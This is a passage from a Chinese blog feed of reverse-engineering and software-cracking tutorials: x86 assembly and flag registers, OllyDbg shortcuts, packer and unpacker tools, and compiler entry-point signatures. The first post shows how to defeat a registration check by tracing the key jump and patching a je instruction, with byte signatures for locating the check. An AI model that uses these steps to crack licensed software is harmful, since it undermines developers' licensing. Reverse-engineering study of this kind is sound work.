alt="image-20210126173747110"></p><p>点击暂停，alt+k</p><p><img src="https://img.rruu.net/image/60515506755f3" alt="image-20210126174333500"></p><p>这里需要注意的是不要盲目选择中文。先看调用过程也就是第三列，找MessageBox然后看到最下面，接着找调用来自，必须要来自程序本身。一般选择最后一个。</p><p><img src="https://img.rruu.net/image/6051550d085ea" alt="image-20210126174953438"></p><p>右键显示调用，往上看肯定是程序的关键跳转或者代码。但是我们不要直接往上找，我们通过程序的跳转把我们带到关键位置去，在下面的jnz下一个断电，然后一直f8跟进。</p><p><img src="https://img.rruu.net/image/605155123da6e" alt="image-20210126175015829"></p><p>发现断在了我们的断点，我们一直f8。</p><p><img src="https://img.rruu.net/image/6051551771d98" alt="image-20210126180223002"></p><p>一直f8，直到看到了注册码错误。这个时候关键call和关键跳一定在上面了。</p><p><img src="https://img.rruu.net/image/6051551d09f76" alt="image-20210126180316417"></p><p>往上看，易语言关键call，关键跳，以及载入窗口的特征。</p><p><img src="https://img.rruu.net/image/60515522aba67" alt="image-20210126182226716"></p><p>修改je跳转为不跳转即可</p><p><img src="https://img.rruu.net/image/605155283eeb0" alt="image-20210126182332527"></p><h3 id="程序按钮事件"><a href="#程序按钮事件" class="headerlink" title="程序按钮事件"></a>程序按钮事件</h3><p>易语言按钮事件特征 FF55FC5F5E</p><p>ctrl+b输入FF55FC5F5E，查找易语言按钮特征。在call这里，下断点。然后f7进入。</p><p><img src="https://img.rruu.net/image/6051552d91521" alt="image-20210126182535417"></p><p>易语言关键跳关键call，载入窗口特征。</p><p><img src="https://img.rruu.net/image/605155330aa47" alt="image-20210126182725094"></p><ul><li>高版本MFC MFC140U.DLL 5783F8?? 0F87???????? FF2485</li><li>VB de 用od脚本</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>汇编基础</title>
      <link href="2021/01/27/4.%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
      <url>2021/01/27/4.%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="寄存器基础"><a href="#寄存器基础" class="headerlink" title="寄存器基础"></a>寄存器基础</h2><p>寄存器</p><ul><li>通用寄存器 eax ebx ecx edx</li><li>段寄存器 ES CS SS DS FS GS</li><li>变址寄存器 ESI EDI</li><li>指针寄存器 ESP EBP</li><li>指令指针寄存器 EIP</li><li>标志寄存器 EFlags OF SF ZF CF AF PF IF TF</li></ul><h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><p>mov</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">数据传送指令 MOV</span><br><span class="line"></span><br><span class="line">格式: MOV OPRD1,OPRD2</span><br><span class="line"></span><br><span class="line">功能: 本指令将一个源操作数送到目的操作数中,即OPRD1&lt;--OPRD2.</span><br></pre></td></tr></table></figure><p>jmp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">无条件转移指令JMP </span><br><span class="line"></span><br><span class="line">格式: JMP OPRD</span><br><span class="line"></span><br><span class="line">功能: JMP指令将无条件地控制程序转移到目的地址去执行.当目的地址仍在同一个代码段内,称为段内转移;当目标地址不在同一个代码段内,则称为段间转移.这两种情况都将产生不同的指令代码,以便能正确地生成目的地址,在         段内转移时,指令只要能提供目的地址的段 内偏移量即够了;而在段间转移时,指令应能提供目的地址的段地址及段内偏移地址值.</span><br></pre></td></tr></table></figure><p>push 传参，向堆栈压入参数值。 pop 弹出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">堆栈操作指令 PUSH和POP</span><br><span class="line"></span><br><span class="line">格式: PUSH OPRD</span><br><span class="line"></span><br><span class="line">POP  OPRD</span><br><span class="line"></span><br><span class="line">功能: 实现压入操作的指令是PUSH指令;实现弹出操作的指令是POP指令.</span><br></pre></td></tr></table></figure><p>call 调用的子程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">过程调用指令 CALL </span><br><span class="line"></span><br><span class="line">格式: CALL OPRD </span><br><span class="line"></span><br><span class="line">功能: 过程调用指令</span><br></pre></td></tr></table></figure><p>inc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">加1指令 INC(INCrement by 1) </span><br><span class="line"></span><br><span class="line">格式: INC OPRD</span><br><span class="line"> </span><br><span class="line">功能: OPRD&lt;--OPRD+1</span><br></pre></td></tr></table></figure><p>add </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">加法指令 ADD(Addition)</span><br><span class="line"> </span><br><span class="line">格式: ADD OPRD1,OPRD2</span><br><span class="line"></span><br><span class="line">功能: 两数相加</span><br></pre></td></tr></table></figure><p>retn 返回结果</p><p>dec</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">减一指令 DEC(Decrement by 1) </span><br><span class="line"></span><br><span class="line">格式: DEC OPRD </span><br><span class="line"></span><br><span class="line">功能: OPRD&lt;--OPRD-1</span><br></pre></td></tr></table></figure><p>sub</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">减法指令SUB(SUBtract) </span><br><span class="line"></span><br><span class="line">格式: SUB OPRD1,OPRD2 </span><br><span class="line"></span><br><span class="line">功能: 两个操作数的相减,即从OPRD1中减去OPRD2,其结果放在OPDR1中.</span><br></pre></td></tr></table></figure><p>imul</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">带符号数乘法指令 IMUL(Integer MULtiply) </span><br><span class="line"></span><br><span class="line">格式: IMUL OPRD</span><br><span class="line"></span><br><span class="line">功能: 完成两个带符号数的相乘</span><br></pre></td></tr></table></figure><p>div</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">无符号数除法指令 DIV(DIVision) </span><br><span class="line"></span><br><span class="line">格式: DIV OPRD </span><br><span class="line"></span><br><span class="line">功能: 实现两个无符号二进制数除法运算.</span><br></pre></td></tr></table></figure><p>idiv</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">带符号数除法指定 IDIV(Interger DIVision) </span><br><span class="line"></span><br><span class="line">格式: IDIV OPRD  </span><br><span class="line"></span><br><span class="line">功能: 这实现两个带符号数的二进制除法运算.</span><br></pre></td></tr></table></figure><p>pushad 将 通用 变址 寄存器压入堆栈</p><p>popad 将通用 变址 寄存器弹出堆栈还原</p><p>pushfd 将标志寄存器压入堆栈</p><p>popdf 将标志寄存器弹出堆栈还原</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PUSHAD :将每个寄存器依次push到栈顶，栈顶提升</span><br><span class="line">相当于依次PUSH EAX ; PUSH ECX ; PUSH EDX ; PUSH EBX……PUSH EDI</span><br><span class="line">POPAD:将栈顶的值依次弹出到EDI ESI EBP ESP EBX EDX ECX EAX</span><br><span class="line">与PUSHAD 构成恢复现场</span><br><span class="line">PUSHDF：将EFL 标志寄存器PUSH到栈顶，栈顶提升</span><br><span class="line">POPDF：将栈顶的数据弹出到EFL 标志寄存器  &#x2F;&#x2F;可以push到内存然后修改后再POP带EFL 这样就可以快速修改多个标志寄存器位</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>leave 平衡堆栈</p><p>nop 填充无意义内容，使某一句话无效。00填充是结束</p><p>cmp 比较大小 第一个减第二个是否为0 为0则相等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp与sub类似，即从目的操作数减去源操作数，但sub会将运算结果送至目的操作数，而cmp不会送至目的操作数；</span><br></pre></td></tr></table></figure><p>test 比较大小 逻辑运算</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test则与and类似，即将两个操作数进行按位“与”运算，但and将运算结果送至目的操作数，而test则不会。</span><br></pre></td></tr></table></figure><h3 id="汇编类型大小"><a href="#汇编类型大小" class="headerlink" title="汇编类型大小"></a>汇编类型大小</h3><p>dword 双字节</p><p>byte 一个字</p><p>word 一个字节</p><h2 id="有条件跳转指令"><a href="#有条件跳转指令" class="headerlink" title="有条件跳转指令"></a>有条件跳转指令</h2><p>je是jump if zero的意思,jz是jump if equal的意思,两者都是结果为0(相等),即zF=1时,转移,两者没有区别</p><p>JE  ;等于则跳转       同JZ</p><p>JNE ;不等于则跳转    同JNZ</p><p>JA  ;无符号大于则跳转</p><p>JNA ;无符号不大于则跳转</p><p>JAE ;无符号大于等于则跳转  同JNB</p><p>JNAE ;无符号不大于等于则跳转   同JB</p><p>JB  ;无符号小于则跳转</p><p>JNB ;无符号不小于则跳转</p><p>JBE ;无符号小于等于则跳转  同JNA</p><p>JNBE ;无符号不小于等于则跳转 同JA</p><p>JG  ;有符号大于则跳转</p><p>JNG ;有符号不大于则跳转</p><p>JGE ;有符号大于等于则跳转  同JNL</p><p>JNGE ;有符号不大于等于则跳转   同JL</p><p>JL  ;有符号小于则跳转</p><p>JNL ;有符号不小于则跳转</p><p>JLE ;有符号小于等于则跳转  同JNG</p><p>JNLE ;有符号不小于等于则跳转 同JG</p><p>JZ  ;为零则跳转</p><p>JNZ ;不为零则跳转</p><p>JS  ;为负则跳转</p><p>JNS ;不为负则跳转</p><p>JC  ;进位则跳转</p><p>JNC ;不进位则跳转</p><p>JO  ;溢出则跳转</p><p>JNO ;不溢出则跳转</p><p>JP  ;为偶则跳转</p><p>JNP ;不为偶则跳转</p><p>JPE ;奇偶位置位则跳转       同JP</p><p>JPO ;奇偶位复位则跳转      同JNP</p><h2 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h2><ol><li>进位标志CF（Carry Flag）</li></ol><p>如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。无符号数</p><p>MOV AL, 0xFF </p><p>ADD AL, 2  </p><ol start="2"><li>奇偶标志PF（Parity Flag）</li></ol><p>奇偶标志PF用于反映运算结果中（最低有效字节中）1的个数的奇偶性。偶数时pf为1</p><p>MOV AL, 3</p><p>ADD AL, 3</p><p>ADD AL, 2</p><ol start="3"><li>辅助进位标志AF（Auxiliary Carry Flag）</li></ol><p>在发生下列情况时， 辅助进位标志AF的值被置为1，否则其值为0：</p><p>（1）在字（word、dword等）操作时，发生低字节向高字节进位或借位时；</p><p>（2）在字节操作时，发生低4位向高4位进位或借位时。</p><p>MOV EAX, 0x55EEFFFF</p><p>ADD EAX, 2</p><p>MOV AX, 5EFE</p><p>ADD AX, 2</p><p>MOV AL, 4E</p><p>ADD AL, 2</p><p>MOV AH, 4E</p><p>ADD AH, 2</p><ol start="4"><li>零标志ZF（Zero Flag）</li></ol><p>零标志ZF用来反映运算结果是否为0。</p><p>如果运算结果为0， 则其值为1， 否则其值为0。在判断运算结果是否为0时，可使用此标志位。</p><p>XOR EAX, EAX</p><p>MOV EAX, 2</p><p>SUB EAX, 2</p><ol start="5"><li>符号标志SF（Sign Flag）</li></ol><p>符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。</p><p>MOV AL, 7F</p><p>ADD AL, 2</p><ol start="6"><li>溢出标志位OF（Overflow Flag）</li></ol><p>溢出标志OF用于反映有符号数加减运算所得结果是否溢出。</p><p>如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则被清为0。</p><p>补码运算：正数为原码本身，负数为原码取反加一<br> 127为正数，其补码为原码0111 1111<br> -127为负数，其补码为原码0111 1111，取反1000 0000,加一，1000 0001。</p><p>0xFFFF ：<br> 要想转换为十进制，可以先转换为二进制，即1111 1111 1111 1111<br> 最高位为符号位，1代表负数<br> 你的问题相当于求其真值，公式为除过符号位其他位取反加一，即<br> 1111 1111 1111 1111 -&gt;1000 0000 0000 0000 -&gt;1000 0000 0000 0001他就是十进制-1</p><p>最高位进位与溢出的区别：</p><p>进位标志CF表示无符号数运算结果是否超出范围。</p><p>溢出标志OF表示有符号数运算结果是否超出范围。</p><p>溢出主要是给有符号运算使用的，在有符号的运算中，有如下的规律：</p><p>正 + 正 = 正，如果结果是负数，则说明有溢出。</p><p>负 + 负 = 负，如果结果是正数，则说明有溢出。</p><p>正 + 负，永远都不会有溢出</p><p>8位16进制表示</p><p>总结：</p><p>（1）无符号数：0……FF</p><p>（2）有符号数： 正数：0……7F 负数：80……FF</p><p>无符号、有符号都不溢出</p><p>MOV AL, 8</p><p>ADD AL, 8</p><p>无符号溢出、有符号不溢出</p><p>MOV AL, FF</p><p>ADD AL, 2</p><p>无符号不溢出、有符号溢出</p><p>MOV AL, 7F</p><p>ADD AL, 2</p><p>无符号、有符号都溢出</p><p>MOV AL, FE</p><p>ADD AL, 80</p><p>CF针对无符号数(将寄存器中的操作数都看作是无符号数)</p><p>OF针对有符号数(将寄存器中的操作数都看作是有符号数)</p><p>有符号无符号指的是最高位是否是符号位，即是以补码的形式看待还是以原码的形式看待。 </p><p>CF范围：0<del>255/0X00</del>0XFF（8位）、0<del>65535/0X0000</del>0XFFFF（16位）、… </p><p>OF范围：-128<del>127/0X80</del>0XEF（8位）、-32768<del>32767/0X8000</del>0XEFFF（16位）、…</p><p>我们再画张图来说明CF与OF的数据范围的区别： </p><p>区别：</p><p>其监测的结果数据范围不同： </p><p>以8位寄存器作为操作种数据来源为例，如果一个运算的结果最终超过[-128，127]无论是大于127还是小于-128就被认为是溢出，OF被置为1，如果结果在[-128，127]就认为没溢出OF被置为0,。 </p><p>而对于cF：如果计算的结果超过[0，255]的范围，就有进位，CF就被置为1，如果结果再[-128，127]范围内，就是没有进位CF被置为0。</p><p>共同点：</p><p>我们经常会将溢出与进位这两个概念混为一谈，就是因为这两个的共同点都是“存不下了”。什么叫存不下了？（依然以8位寄存器为例）。我们先举个例子（寄存器宽度为8位）： </p><p>（1）、8H+8H： </p><p>对于signed：(8)+(8)=16,没超过[-128,127]的范围，OF为0 </p><p>对于unsigned：(8)+(8)=16,没超过[0,255]的范围，CF为0 </p><p>（2）、80H+81H： </p><p>对于signed：(-128)+(-127)=-255,超过[-128,127]的范围，OF为1 </p><p>对于unsigned：(128)+(129)=257,超过[0,255]的范围，CF为1 </p><p>（3）、FCH+05H： </p><p>对于signed：(-4)+(5)=1,没有超过[-128,127]的范围，OF为0 </p><p>对于unsigned：(252)+(5)=257,超过[0,255]的范围，CF为1 </p><p>（4）、7FH+2H： </p><p>对于signed：(127)+(2)=129,超过[-128,127]的范围，OF为1 </p><p>对于unsigned：(127)+(2)=129,没超过[0,255]的范围，CF为0</p><p>我们看到超过表示范围的原因都是值太大，当前位数表示不了，但是对于同样位数的寄存器，有符号与无符号就不一样了。同样的位数，OF除了符号位外能表示的值只有七位是数据，而CF认为有八位是数据位。但是我们知道这只是其共同点，不代表这两个有关系，上例也表示，OF、CF的0与1是没有直接联系的。只要记住有符号与无符号的数据范围，并且记住OF是对于有符号数，CF对于无符号数即可。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>OD使用</title>
      <link href="2021/01/26/3.od%E4%BD%BF%E7%94%A8/"/>
      <url>2021/01/26/3.od%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="OD窗口"><a href="#OD窗口" class="headerlink" title="OD窗口"></a>OD窗口</h2><p><img src="https://img.rruu.net/image/605154d855230" alt="image-20210126171441394"></p><h2 id="OD快捷键"><a href="#OD快捷键" class="headerlink" title="OD快捷键"></a>OD快捷键</h2><ul><li>Ctrl + F2 重启程序，即重新启动被调试程序（ 重新载入程序 ）。如果当前没有调试的程序，OllyDbg会运行历史列表［historylist］中的第一个程序。程序重启后，将会删除所有内存断点和硬件断点。译者注：从实际使用效果看，硬件断点在程序重启后并没有移除。</li><li>Alt + F2     关闭，即关闭被调试程序。如果程序仍在运行，会弹出一个提示信息，询问您是否要关闭程序。</li><li>F2  设置断点(INT3型断点)，只要在光标定位的位置（上图中灰色条）按 F2 键即可，再按一次 F2键则会删除断点。</li><li>Shift + F2    设置条件断点</li><li>F3  弹出 “ 打开32位.EXE文件 “ 对话框。选择可执行文件，并可以输入运行参数。</li><li>F4  运行到所选择的那一行。作用就是直接运行到光标所在位置处暂停。即 执行到光标所在位置(直接转到要调试的位置)</li><li>Shift + F4   设置记录断点（一种条件断点，当条件满足时一些表达式的值会记录下来）， 详情参见断点［Breakpoint］。</li><li>F5  最大化当前窗口或将当前窗口大小改为正常化。</li><li>Alt + F5 让 OllyDbg 总在最前面。</li><li>F6  切换到下一个窗口。 </li><li>Shift + F6   切换到前一个窗口。</li><li>F7  单步步入到下一条命令（ 单步进入 ），如果当前命令是一个函数［Call］，则会停在这个函数体的第一条命令上。如果当前命令是是含有REP前缀，则只执行一次重复操作。</li><li>Shift + F7   与 F7 相同，但是如果被调试程序发生异常而中止，调试器会首先尝试步入被调试程序指定的异常处理（请参考忽略Kernel32中的内存非法访问）。</li><li>Ctr l+ F7 自动步入，在所有的函数调用中一条一条地执行命令（就像按住 F7 键不放一样，只是更快一些）。当您执行其他一些单步命令，或者程序到达断点，或者发生异常时，自动步入过程都会停止。每次单步步入，OllyDbg都会更新所有的窗口。所以为了提高自动步入的速度，请您关闭不必要成窗口，对于保留的窗口最好尽量的小。按Esc键，可以停止自动步入。</li><li>F8  单步步过到下一条命令（ 单步跳过 ）。如果当前命令是一个函数，则一次执行完这个函数（除非这个函数内部包含断点，或发生了异常）。如果当前命令是含有REP前缀，则会执行完重复操作，并停在下一条命令上。</li><li>Shift + F8   与 F8 相同，但是如果被调试程序发生异常而中止，调试器会首先尝试步过被调试程序指定的异常处理（请参考忽略 Kernel32 中的内存非法访问）。</li><li>Ctrl + F8    自动步过，一条一条的执行命令，但并不进入函数调用内部（就像按住 F8 键不放一样，只是更快一些）。当您执行其他一些单步命令，或者程序到达断点，或者发生异常时，自动步过过程都会停止。每次单步步过，OllyDbg都会更新所有的窗口。所以为了提高自动步过的速度，请您关闭不必要成窗口，对于保留的窗口最好尽量的小。按Esc键，可以停止自动步过。</li><li>F9  运行，遇到断点则停在断点位置。如果没有设置相应断点的话，被调试的程序将直接开始运行直到结束。</li><li>Shift + F9   与 F9 相同，但是如果被调试程序发生异常而中止，调试器会首先尝试执行被调试程序指定的异常处理（请参考忽略Kernel32中的内存非法访问）。</li><li>Ctrl + F9    把本层call执行完。即执行函数代码内的命令，直到遇到 RETN 命令，用于跳出函数体。在此期间不进入子函数也不更新CPU数据。因为程序是一条一条命令执行的，所以速度可能会慢一些。按Esc键，可以停止跟踪。</li><li>Alt + F9     执行直到返回到用户代码段，跟踪程序直到指令所属于的模块不在系统目录中，在此期间不进入子函数也不更新CPU数据。因为程序是一条一条执行的，所以速度可能会慢一些。按Esc键，可以停止跟踪。</li><li>F10    打开与当前窗口或面板相关的快捷菜单。</li><li>Ctrl + F11   Run 跟踪步入，一条一条执行命令，进入每个子函数调用，并把寄存器的信息加入到Run跟踪的存储数据中。Run跟踪不会同步更新CPU窗口。</li><li>F12 暂停程序，F9 可以继续运行。</li><li>Ctrl + F12   Run 跟踪。步过，一条一条执行命令，但是不进入子函数调用，并把寄存器的信息加入到Run跟踪的存储数据中。Run跟踪不会同步更新CPU窗口。</li><li>Esc     如果当前处于自动运行或跟踪状态，则停止自动运行或跟踪。如果CPU显示的是跟踪数据，则显示真实数据。</li><li>空格   点击反汇编窗口，可以修改原有汇编代码</li><li>分号(或者直接双击) 增加注释</li><li>回车 Enter 将选中的命令添加到命令历史［command history］中，如果当前命令是一个跳转、函数或者是转换表的一个部分，则进入到目的地址。即在返汇编窗口里面点击 call，可以查看 call 内反汇编代码。</li><li>Alt + B  显示断点窗口。在这个窗口中，您可以编辑、删除、或跟进到断点处。</li><li>Alt + C  显示 CPU 窗口。</li><li>Alt + E  显示模块列表［list of modules］。</li><li>Alt + K  显示调用栈［Call stack］窗口。</li><li>Alt + L  显示日志窗口。</li><li>Alt + M  显示内存窗口。</li><li>Alt + O  显示选项对话框［Options dialog］</li><li>Alt + X  关闭 OllyDbg。</li><li>退格键 移除选中部分的自动分析信息。如果分析器将代码误识别为数据，这个快捷键就非常有用。</li><li>Alt + 退格键    撤消所选部分的修改，以备份数据的相应内容替换所选部分。仅当备份数据存在且与所选部分不同时可用。</li><li>Ctrl+F1 如果API帮助文件已经选择，将打开与首个选择行内的符号名相关联的帮助主题。</li><li>Ctrl+F5  打开与首个选择的命令相对应的源文件。</li><li>Alt+F7  转到上一个找到的参考。</li><li>Alt+F8  转到下一个找到参考。</li><li>Ctrl+A  分析当前模块的代码段。</li><li>Ctrl+B  开始二进制搜索。</li><li>Ctrl+C  复制所选内容到剪贴板。复制时会简单地按列宽截断不可见内容，如果希望排除不需要的列，可把这些列的宽度调整到最小。</li><li>Ctrl+E  以二进制（十六进制）格式编辑所选内容。</li><li>Ctrl+F  开始命令搜索。</li><li>Ctrl+G  转到某地址。该命令将弹出输入地址或表达式的窗口。该命令不会修改 EIP。</li><li>Ctrl+J   列出所有的涉及到该位置的调用和跳转，在您用这个功能之前，您必须使用分析代码功能。</li><li>Ctrl+K  查看与当前函数相关的调用树［Call tree］。在您用这个功能之前，您必须使用分析代码功能。</li><li>Ctrl+L  搜索下一个，重复上一次的搜索内容。</li><li>Ctrl+N  打开当前模块的名称（标签）列表。</li><li>Ctrl+O  扫描object文件。扫描Object文件。该命令会显示扫描Object文件对话框，您可以在该对话框中选择Object文件或者lib文件，并扫描这个文件，试图找到在实际代码段中用到的目标模块。</li><li>Ctrl+R  搜索所选命令的参考。该命令扫描激活模块的全部可执行代码，以找到涉及到首个选中的命令的全部相关参考（包括：常量、跳转及调用），您可以在参考中使用快捷键Alt+F7 和 Alt+F8来浏览这些参考。为便于您使用，被参考的命令也包含在该列表中。</li><li>Ctrl+S  命令搜索。该命令显示命令查找［Find command］对话框供您输入汇编命令，并从当前命令开始搜索。</li><li>星号 (*)    转到原始位置（激活线程的EIP处）。</li><li>Ctrl + 星号(*)   指定新的起始位置，设置当前所选线程的EIP为首个选择字节的地址。您可以在选择EIP并撤消该操作。</li><li>加号 (+)    如果run跟踪［run trace］ 没有激活，则根据命令历史［command history］跳到下一条运行过命令的地方；否则跳到Run跟踪的下一个记录。</li><li>Ctrl + 加号 跳到前一个函数开始处。（注意只是跳到，并不执行）</li><li>减号 (-) 如果run跟踪［run trace］ 没有激活，则根据命令历史［command history］跳到前一条运行过命令的地方；否则跳到Run跟踪的前一个记录。</li><li>Ctrl + 减号 跳到下一个函数开始处。（注意只是跳到，并不执行）</li><li>空格   修改命令。您可在显示对话框中以汇编语言修改实际指令或输入新指令，这些指令将替换实际代码，您也可以在想要修改的指令处双击鼠标。</li><li>冒号(:)  添加标签。显示添加标签窗口［Add label］或修改标签窗口［Changelabel］，您可在此输入与首个选择的命令中的第一个字节相关联的标签（符号名）。注意，在多种编程语言中，冒号可以是标签的一部分。</li><li>分号 (;)  添加注释［comment］。显示添加注释窗口［Add label］或修改注释窗口［Changelabel］，您可在此输入与首条所选命令的第一个字节相关联的注释（注释串会显示在最后一列中）。</li><li> 注意，多种汇编语言使用分号作为注释开始。您也可以在注释列双击需要注释的命令行。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>常用工具介绍</title>
      <link href="2021/01/25/2.%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/"/>
      <url>2021/01/25/2.%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<h2 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h2><p>#查壳工具</p><ul><li>die</li><li>peie</li><li>exeinfo</li><li>die</li></ul><p>#区段特征</p><ul><li>易语言与VC都是4个区段</li><li>C语言是5个区段</li><li>delphi 与 bc++ 都是有很多个区段的</li><li>C# 只有3个区段 有时候有两个</li><li>vb是两个区段</li><li>vmp壳区段会显示.vmpl</li><li>se壳区段会显示sedata</li><li>enigma壳区段名大片空白</li></ul><h2 id="常用破解软件"><a href="#常用破解软件" class="headerlink" title="常用破解软件"></a>常用破解软件</h2><p>#调试工具</p><ul><li>OD</li><li>c32asm</li><li>英文版od 稳定性较高</li><li>零日od 插件多</li><li>od修改 魔改版本过检测</li><li>ida 多用于安卓 病毒 外挂分析</li><li>dede 专门用于逆向delphi程序</li></ul><p>#pe工具</p><ul><li>imprec 用于修复导入表 拖加密壳</li><li>uif zp专用脱壳工具，修复pe。</li><li>LordPe pe编辑器</li><li>petools pe编辑器</li><li>IAT重建工具 修复IAT</li></ul><p>#汇编工具</p><ul><li>c32asm 程序转换十六进制</li><li>winhex 程序转换十六进制，功能更强大。</li></ul><p>#破解辅助</p><ul><li>蓝屏hook</li><li>srsniffer 抓包</li></ul><p>#脱壳工具</p><ul><li>dump_E ver 针对易语言独立编译</li><li>upx脱壳机</li><li>telock脱壳机</li><li>aspack脱壳机</li><li>穿山甲脱壳机</li><li>华中帝国万能脱壳机 压缩壳脱壳机</li></ul><p>#补丁工具</p><ul><li>樱花补丁</li><li>特征码补丁</li><li>大白补丁</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>壳与编程语言的基本认知</title>
      <link href="2021/01/24/1.%E5%A3%B3%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AE%A4%E7%9F%A5/"/>
      <url>2021/01/24/1.%E5%A3%B3%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AE%A4%E7%9F%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="加密壳与压缩壳介绍与区别"><a href="#加密壳与压缩壳介绍与区别" class="headerlink" title="加密壳与压缩壳介绍与区别"></a>加密壳与压缩壳介绍与区别</h2><p>#常见的软件壳</p><ul><li>加密壳 zprotect vprotect enigma VMPprotect Shielden SDK</li><li>压缩壳 upx aspcak 掘北</li></ul><p>#一般情况都能破解的壳：</p><ul><li>所有压缩壳</li><li>zp可以脱壳</li><li>vprotect enigma修改机器码</li><li>VMP Shielden破解不了</li></ul><p>#常用的查壳工具</p><ul><li><p>exeinfope 更新网址：<a href="http://www.exeinfo.xn.pl/">http://www.exeinfo.xn.pl/</a></p></li><li><p>peid 停止更新</p></li><li><p>die</p></li></ul><h2 id="常见编程语言的入口特征"><a href="#常见编程语言的入口特征" class="headerlink" title="常见编程语言的入口特征"></a>常见编程语言的入口特征</h2><p>#常见的软件壳</p><ul><li><p>常见的编程语言：delphi vc++6.0 易语言 C# vb dasm bc++</p></li><li><p>OEP就是程序入口点</p><h3 id="易语言入口点特征"><a href="#易语言入口点特征" class="headerlink" title="易语言入口点特征"></a>易语言入口点特征</h3><ul><li>OEP写死 00401000</li><li>入口点载入knr文件 动态编译</li></ul></li></ul><p>入口特征如下（仅静态编译）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00403831 &gt;&#x2F;$  55            PUSH EBP</span><br><span class="line">00403832  |.  8BEC          MOV EBP,ESP</span><br><span class="line">00403834  |.  6A FF         PUSH -1</span><br><span class="line">00403836  |.  68 F0624000   PUSH Nisy521.004062F0</span><br><span class="line">0040383B  |.  68 A44C4000   PUSH Nisy521.00404CA4                    ;  SE 处理程序安装</span><br><span class="line">00403840  |.  64:A1 0000000&gt;MOV EAX,DWORD PTR FS:[0]</span><br><span class="line">00403846  |.  50            PUSH EAX</span><br><span class="line">00403847  |.  64:8925 00000&gt;MOV DWORD PTR FS:[0],ESP</span><br></pre></td></tr></table></figure><h3 id="bc-入口点特征"><a href="#bc-入口点特征" class="headerlink" title="bc++入口点特征"></a>bc++入口点特征</h3><p>开头很明显的 fb:c++hook</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 